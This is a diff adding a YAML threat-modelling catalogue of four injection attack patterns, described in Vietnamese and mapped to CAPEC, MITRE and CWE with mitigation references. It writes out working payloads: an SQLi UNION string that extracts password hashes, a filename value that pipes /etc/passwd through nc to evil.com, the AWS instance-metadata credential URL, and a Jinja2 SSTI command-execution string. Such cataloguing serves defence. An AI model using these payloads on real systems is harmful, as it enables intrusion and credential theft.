@@ -1,0 +1,57 @@
+pattern_id: ASRP-AP-INJ-001
+name: Injection & Server-Side Execution Attack Patterns
+version: 2.0.0
+applicable_stack: [sql, nosql, python, nodejs, nestjs, java, go, express, django, fastapi]
+
+attack_patterns:
+  - attack_id: ATK-CAPEC-66
+    capec_id: CAPEC-66
+    mitre_technique: T1190 (Exploit Public-Facing Application / SQLi)
+    name: Blind SQL Injection via Dynamic Query String Concatenation
+    severity: CRITICAL
+    target_vulnerability: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
+    attack_vector: |
+      Bước 1: Attacker gửi HTTP request với payload SQLi trong tham số tìm kiếm: `' UNION SELECT SLEEP(5), username, password_hash FROM users --`.
+      Bước 2: Backend ghép trực tiếp chuỗi `searchQuery` vào câu SQL thô `db.query("SELECT * FROM products WHERE name = '" + searchQuery + "'")`.
+      Bước 3: Cơ sở dữ liệu thực thi lệnh chèn, rò rỉ toàn bộ bảng tài khoản mật khẩu hoặc trì hoãn câu lệnh theo kỹ thuật Time-Based Blind SQLi.
+    prerequisites: Backend dùng Raw SQL Query string concatenation thay vì Parameterized Queries / ORM Prepared Statements.
+    mitigation_refs: [SCG-NEST-001, SCG-PYTHON-001, THREAT-I-002, REM-007]
+
+  - attack_id: ATK-CAPEC-88
+    capec_id: CAPEC-88
+    mitre_technique: T1059 (Command and Scripting Interpreter)
+    name: OS Command Injection via Unsanitized Child Process Execution
+    severity: CRITICAL
+    target_vulnerability: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
+    attack_vector: |
+      Bước 1: Attacker gửi request chứa tham số filename độc hại: `report.pdf; cat /etc/passwd | nc evil.com 4444`.
+      Bước 2: Backend truyền tham số trực tiếp vào hàm thực thi lệnh hệ thống `child_process.exec("convert " + filename + " output.png")` hoặc `os.system()`.
+      Bước 3: HĐH mở một sub-shell thực thi cả lệnh chuyển đổi tệp lẫn lệnh đọc và đẩy file nhạy cảm `/etc/passwd` ra server ngoài.
+    prerequisites: Sử dụng shell execution wrapper (`exec`, `system`) với tham số không được whitelist hoặc làm sạch.
+    mitigation_refs: [SCG-NEST-006, SCG-PYTHON-002, THREAT-E-001, REM-007]
+
+  - attack_id: ATK-CAPEC-664
+    capec_id: CAPEC-664
+    mitre_technique: T1552.005 (Unsecured Credentials: Cloud Instance Metadata Services)
+    name: SSRF Cloud Instance Metadata Service (IMDSv2) Credential Exfiltration
+    severity: CRITICAL
+    target_vulnerability: CWE-918 (Server-Side Request Forgery - SSRF)
+    attack_vector: |
+      Bước 1: Attacker tìm thấy tính năng "Import URL" hoặc "Webhook Verification" cho phép server gửi HTTP request tới URL tùy chọn.
+      Bước 2: Attacker truyền URL Metadata máy chủ AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role`.
+      Bước 3: Backend thực hiện HTTP call từ bên trong VPC, nhận chuỗi AccessKey, SecretKey, SessionToken của IAM Role và trả về cho Attacker.
+    prerequisites: URL Parser Backend không chặn dải IP Private/Loopback (`169.254.169.254`, `127.0.0.1`, `10.0.0.0/8`).
+    mitigation_refs: [SCG-NEST-007, SCG-PYTHON-003, THREAT-I-002, REM-007]
+
+  - attack_id: ATK-CAPEC-586-DESER
+    capec_id: CAPEC-586
+    mitre_technique: T1059 (Command and Scripting Interpreter / Insecure Deserialization)
+    name: Remote Code Execution via Insecure Object Deserialization / SSTI
+    severity: CRITICAL
+    target_vulnerability: CWE-502 (Deserialization of Untrusted Data)
+    attack_vector: |
+      Bước 1: Attacker gửi dữ liệu serialized độc hại (như Python `pickle`, Java `ObjectInputStream`, hoặc Template Syntax Jinja2 `{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}`).
+      Bước 2: Backend tự động deserialize hoặc compile template với dữ liệu từ client mà không qua sandbox.
+      Bước 3: Server thực thi gadget chain trong bộ nhớ, cấp quyền Remote Code Execution (RCE) đầy đủ cho Attacker.
+    prerequisites: Ứng dụng chấp nhận binary serialized payload hoặc nạp dữ liệu người dùng trực tiếp vào Template Engine.
+    mitigation_refs: [SCG-PYTHON-001, SCG-JAVA-001, THREAT-E-001, REM-007]
